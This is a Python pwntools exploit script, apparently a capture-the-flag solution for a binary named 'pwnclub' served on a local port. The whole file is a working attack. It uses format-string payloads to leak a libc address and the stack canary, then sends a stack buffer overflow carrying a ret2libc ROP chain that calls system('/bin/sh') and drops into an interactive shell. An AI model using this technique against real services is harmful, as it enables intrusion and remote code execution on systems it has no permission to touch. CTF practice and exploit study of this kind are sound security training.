#!/usr/bin/env python2
from pwn import *
context(arch='amd64')

FNAME = './pwnclub'
DEBUG = False
REMOTE = True

HOST = '127.0.0.1'
PORT = '31337'

# Strategy:
# 1) Use strfmt to leak libc address
# 2) Use strfmt to leak stack canary
# 3) Use stack overflow to perform ret2libc

# From Debug Session:
# Second param on stack (e.g. %p%p): 0x7fddde6898c0
# Address of libc read function: 0x7fddde3ac070
# We can calculate the offset as below
# 0x7fddde6898c0(leak) - 0x7fddde3ac070(read) == 0x2dd850
# So at runtime, we can calculate address of read with the following:
# leak - 0x2dd850 == read

# Strfmt payloads used:
# %2$p -> libc addr
# %39$p -> canary


# Load libc shared lib
if REMOTE:
    libc = ELF('./libc-2.27.so')
else:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')


# Start the process or create connection to remote server
if REMOTE:
    p = remote(HOST, PORT)
elif DEBUG:
    p = process(['linux_serverx64', '-p4200', FNAME])
else:
    p = process([FNAME])


# Leak libc address
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('payload: ')

payload = '%2$p'
p.sendline(payload)
p.recvline()

ret = p.recvline().strip()
libc_leak = eval(ret)
log.info('libc leaked address: 0x%x' % libc_leak)

# Calculate address of libc read() function
libc_read_addr = libc_leak - 0x2dd850
log.info('libc read address: 0x%x' % libc_read_addr)

libc_base = libc_read_addr - libc.symbols["read"]
libc.address = libc_base
log.info('libc base address: 0x%x' % libc.address)

# Build out our ROP chain now that we have libc address
rop = ROP(libc)
binsh_addr = next(libc.search('/bin/sh\x00'))
log.info('/bin/sh @ 0x%x' % binsh_addr)
# Why do I have to do this twice?
rop.system(binsh_addr)
rop.system(binsh_addr)
rop.exit(42)
log.info('ret2libc ROP: \n' + rop.dump())

# Leak the stack canary
p.recvuntil('> ')
p.sendline('1')
p.recvuntil('payload: ')

payload = '%39$p'
p.sendline(payload)
p.recvline()

ret = p.recvline().strip()
stack_canary = eval(ret)

log.info('Stack Canary: 0x%x' % stack_canary)


# Perform Buffer Overflow
p.recvuntil('> ')
p.sendline('2')

payload = ''
payload += 'A'*24
payload += p64(stack_canary)
payload += 'C'*8
payload += str(rop)
p.sendline(payload)

# Trigger the exploit
p.recvuntil('> ')
p.sendline('3')

# Interactive Shell
p.interactive()
